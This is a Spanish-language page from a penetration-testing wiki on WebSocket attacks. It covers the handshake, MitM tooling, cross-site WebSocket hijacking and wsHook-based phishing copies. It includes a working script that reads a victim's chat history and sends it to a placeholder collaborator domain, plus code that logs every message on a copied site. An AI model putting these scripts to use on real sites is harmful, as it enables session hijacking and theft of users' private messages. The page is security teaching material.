# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## Qué son los WebSockets

Las conexiones WebSocket se establecen a través de un **handshake HTTP** inicial y están diseñadas para ser **de larga duración**, permitiendo la mensajería bidireccional en cualquier momento sin la necesidad de un sistema transaccional. Esto hace que los WebSockets sean particularmente ventajosos para aplicaciones que requieren **baja latencia o comunicación iniciada por el servidor**, como flujos de datos financieros en vivo.

### Establecimiento de Conexiones WebSocket

Una explicación detallada sobre el establecimiento de conexiones WebSocket se puede acceder [**aquí**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). En resumen, las conexiones WebSocket suelen ser iniciadas a través de JavaScript del lado del cliente como se muestra a continuación:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
El protocolo `wss` significa una conexión WebSocket asegurada con **TLS**, mientras que `ws` indica una conexión **no asegurada**.

Durante el establecimiento de la conexión, se realiza un apretón de manos entre el navegador y el servidor a través de HTTP. El proceso de apretón de manos implica que el navegador envía una solicitud y el servidor responde, como se ilustra en los siguientes ejemplos:

El navegador envía una solicitud de apretón de manos:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Respuesta del apretón de manos del servidor:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La conexión permanece abierta para el intercambio de mensajes en ambas direcciones una vez establecida.

**Puntos Clave del Handshake de WebSocket:**

- Los encabezados `Connection` y `Upgrade` señalan el inicio de un handshake de WebSocket.
- El encabezado `Sec-WebSocket-Version` indica la versión del protocolo WebSocket deseada, generalmente `13`.
- Un valor aleatorio codificado en Base64 se envía en el encabezado `Sec-WebSocket-Key`, asegurando que cada handshake sea único, lo que ayuda a prevenir problemas con proxies de caché. Este valor no es para autenticación, sino para confirmar que la respuesta no es generada por un servidor o caché mal configurado.
- El encabezado `Sec-WebSocket-Accept` en la respuesta del servidor es un hash del `Sec-WebSocket-Key`, verificando la intención del servidor de abrir una conexión WebSocket.

Estas características aseguran que el proceso de handshake sea seguro y confiable, allanando el camino para una comunicación en tiempo real eficiente.

### Consola de Linux

Puedes usar `websocat` para establecer una conexión en bruto con un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
O para crear un servidor websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### Conexiones websocket MitM

Si descubres que los clientes están conectados a un **HTTP websocket** desde tu red local actual, podrías intentar un [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) para realizar un ataque MitM entre el cliente y el servidor.\
Una vez que el cliente esté intentando conectarse, puedes usar:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumeración de Websockets

Puedes usar la **herramienta** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **para descubrir, identificar y buscar** **vulnerabilidades** **conocidas** en websockets automáticamente.

### Herramientas de depuración de Websocket

- **Burp Suite** soporta la comunicación de websockets MitM de una manera muy similar a como lo hace para la comunicación HTTP regular.
- La **extensión de Burp Suite** [**socketsleuth**](https://github.com/snyk/socketsleuth) **te permitirá gestionar mejor las comunicaciones de Websocket en Burp al obtener el **historial**, establecer **reglas de interceptación**, usar reglas de **coincidencia y reemplazo**, usar **Intruder** y **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abreviatura de "**WebSocket/Socket.io Proxy**", esta herramienta, escrita en Node.js, proporciona una interfaz de usuario para **capturar, interceptar, enviar mensajes personalizados** y ver todas las comunicaciones de WebSocket y Socket.IO entre el cliente y el servidor.
- [**wsrepl**](https://github.com/doyensec/wsrepl) es un **REPL de websocket interactivo** diseñado específicamente para pruebas de penetración. Proporciona una interfaz para observar **mensajes de websocket entrantes y enviar nuevos**, con un marco fácil de usar para **automatizar** esta comunicación.
- [**https://websocketking.com/**](https://websocketking.com/) es una **web para comunicarse** con otras webs usando **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) entre otros tipos de comunicaciones/protocolos, proporciona una **web para comunicarse** con otras webs usando **websockets.**

## Laboratorio de Websocket

En [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) tienes un código para lanzar una web usando websockets y en [**esta publicación**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) puedes encontrar una explicación.

## Secuestro de WebSocket entre sitios (CSWSH)

El **secuestro de WebSocket entre sitios**, también conocido como **secuestro de WebSocket de origen cruzado**, se identifica como un caso específico de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** que afecta a los handshakes de WebSocket. Esta vulnerabilidad surge cuando los handshakes de WebSocket se autentican únicamente a través de **cookies HTTP** sin **tokens CSRF** o medidas de seguridad similares.

Los atacantes pueden explotar esto al alojar una **página web maliciosa** que inicia una conexión de WebSocket entre sitios a una aplicación vulnerable. En consecuencia, esta conexión se trata como parte de la sesión de la víctima con la aplicación, aprovechando la falta de protección CSRF en el mecanismo de manejo de sesiones.

### Ataque Simple

Ten en cuenta que al **establecer** una conexión de **websocket**, la **cookie** es **enviada** al servidor. El **servidor** podría estar usándola para **relacionar** a cada **usuario específico** con su **sesión de websocket** basada en la cookie enviada.

Entonces, si por **ejemplo** el **servidor de websocket** **devuelve el historial de la conversación** de un usuario si se envía un mensaje con "**READY"**, entonces un **XSS simple** estableciendo la conexión (la **cookie** será **enviada** **automáticamente** para autorizar al usuario víctima) **enviando** "**READY**" podrá **recuperar** el historial de la **conversación**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie con un subdominio diferente

En esta publicación de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) el atacante logró **ejecutar Javascript arbitrario en un subdominio** del dominio donde estaba ocurriendo la comunicación por websocket. Debido a que era un **subdominio**, la **cookie** estaba siendo **enviada**, y como el **Websocket no verificó correctamente el Origin**, fue posible comunicarse con él y **robar tokens de él**.

### Robando datos del usuario

Copia la aplicación web que deseas suplantar (los archivos .html por ejemplo) y dentro del script donde está ocurriendo la comunicación por websocket agrega este código:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Ahora descarga el archivo `wsHook.js` de [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) y **guárdalo dentro de la carpeta con los archivos web**.\
Exponiendo la aplicación web y haciendo que un usuario se conecte a ella, podrás robar los mensajes enviados y recibidos a través de websocket:
```javascript
sudo python3 -m http.server 80
```
## Condiciones de carrera

Las Condiciones de carrera en WebSockets también son un tema, [consulta esta información para aprender más](race-condition.md#rc-in-websockets).

## Otras vulnerabilidades

Dado que los Web Sockets son un mecanismo para **enviar datos al lado del servidor y al lado del cliente**, dependiendo de cómo el servidor y el cliente manejen la información, **los Web Sockets pueden ser utilizados para explotar varias otras vulnerabilidades como XSS, SQLi o cualquier otra vulnerabilidad web común utilizando la entrada de un usuario desde un websocket.**

## **WebSocket Smuggling**

Esta vulnerabilidad podría permitirte **eludir las restricciones de proxies inversos** haciéndoles creer que se **estableció una comunicación websocket** (incluso si no es cierto). Esto podría permitir a un atacante **acceder a puntos finales ocultos**. Para más información, consulta la siguiente página:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Referencias

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
